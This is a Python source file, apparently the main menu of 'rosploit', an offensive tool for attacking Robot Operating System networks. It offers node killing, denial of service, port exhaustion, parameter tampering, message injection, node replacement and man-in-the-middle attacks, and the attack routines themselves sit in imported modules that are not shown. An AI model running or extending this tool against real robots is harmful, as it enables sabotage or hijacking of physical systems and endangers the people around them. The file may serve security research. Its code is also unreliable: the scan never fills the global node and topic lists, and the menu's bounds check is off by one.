import signal
import sys
from typing import List

import exploit
import recon
from core import Node, Message, Topic

node_list = []
topic_list = []
node_name = "/rosploit"


def signal_handler(sig, frame):
    print('Caught signal Exiting')
    sys.exit(0)


def print_options():
    print("Welcome to rosploit")
    print("Enter a number to activate that option")
    print("0) Exit")
    print("1) Run a scan of the system ")
    print("2) Display current detected rosgraph")
    print("3) Kill a node")
    print("4) Run a DOS against a selected host")
    print("5) Exhaust all open ports on a selected host")
    print("6) List all the parameters on the parameter server")
    print("7) Change a parameter on the parameter server")
    print("8) Inject data onto a given topic")
    print("9) Replace a node with a copy under your control")
    print("10) Perform a Man in the Middle(MITM) attack against two nodes over a topic ")


def leave():
    save = int(input("Would you like to save your results? (1 for yes)"))
    if save == 1:
        print("TODO")
    sys.exit(0)


def scan_system():
    node_list: List[Node] = recon.scan_host('127.0.0.1', '1-', ['ros-master-scan.nse', 'ros-node-id.nse'])
    for node in node_list:
        node.get_pub_list(node_name)
        node.get_sub_list(node_name)
        node.get_name(node_name)
        if "Master" in node.notes:
            topic_list = Topic.from_master(node.server.getPublishedTopics(node_name, ""))


def print_graph():
    # TODO: Prettier graph
    for node in node_list:
        print(node)
    for topic in topic_list:
        print(topic)


def kill_node():
    target_name = input("Enter the name of the node you want to kill")
    for node in node_list:
        if node.name == target_name:
            exploit.kill_node(node, node_name=node_name)
            return
    print("Failed to find node to kill")


def dos():
    target_name = input("Enter the name of the node you want to dos")
    for node in node_list:
        if node.name == target_name:
            exploit.dos(node)
            return
    print("Failed to find node to dos")


def port_exhaust():
    target_name = input("Enter the name of the node you want to exhaust the ports of")
    for node in node_list:
        if node.name == target_name:
            exploit.port_exhaust(target_node=node, node_name=node_name)
            return
    print("Failed to find node to dos")


def list_param():
    for node in node_list:
        if "Master" in node.notes:
            exploit.list_parameters(node, node_name)
            return
    print("Failed to find the parameter server")


def change_param():
    target_param = input("Enter the name of the param you want to change")
    target_value = input("Enter the new value of the param")
    for node in node_list:
        if "Master" in node.notes:
            exploit.change_parameter(node, node_name, target_param, target_value)
            return
    print("Failed to find the parameter server")


def message_inject():
    target_topic = input("Enter the name of the topic you want to inject")
    target_node = input("Enter the name of the node you want to inject to")
    target_message = input("Enter the message you want to inject (json)")
    for node in node_list:
        if node.name == target_node:
            for topic in topic_list:
                if topic.name == target_topic:
                    exploit.message_injection(target_node=node, target_topic=topic, node_name=node_name,
                                              message=Message.from_json(target_message))
    print("Failed to find the topic to inject")


def replace_node():
    target_node = input("Enter the name of the node you want to replace")
    # TODO: Consider more parameters
    for node in node_list:
        if node.name == target_node:
            exploit.replace_node(target_node=node, node_name=node_name)
    print("Failed to replace the node")


def mitm_dummy(message: Message, topic: Topic):
    """
    Generic dummy function for the mitm. Just sends each message twice
    :param message: The last received message from the publisher
    :param topic: the topic
    :return:
    """
    topic.publish(message)
    topic.publish(message)


def mitm():
    # Currently the demo function just doubles messages
    target_node1 = input("Enter the name of the first node you want to attack for the mitm")
    target_node2 = input("Enter the name of the second node you want to attack for the mitm")
    topic_name = input("Enter the name of the topic you want to attack for the mitm")
    t1 = None
    t2 = None
    target_topic = None
    for node in node_list:
        if node.name == target_node2:
            t2 = node
        if node.name == target_node1:
            t1 = node
        if t1 and t2:
            for topic in topic_list:
                if topic.name == topic_name:
                    target_topic = topic
            exploit.mitm(node1=t1, node2=t2, topic=target_topic, node_name=node_name, interface_func=mitm_dummy)
            return

    print("Failed to find both nodes or topic")


def rosploit():
    signal.signal(signal.SIGINT, signal_handler)
    function_list = [exit, scan_system, print_graph, kill_node, dos, port_exhaust, list_param, change_param,
                     message_inject,
                     replace_node,
                     mitm]
    while True:
        print_options()
        option = int(input("Select option:"))
        if option > len(function_list):
            print(option)
            print("Invalid Option")
        else:
            function_list[option]()


if __name__ == "__main__":
    rosploit()
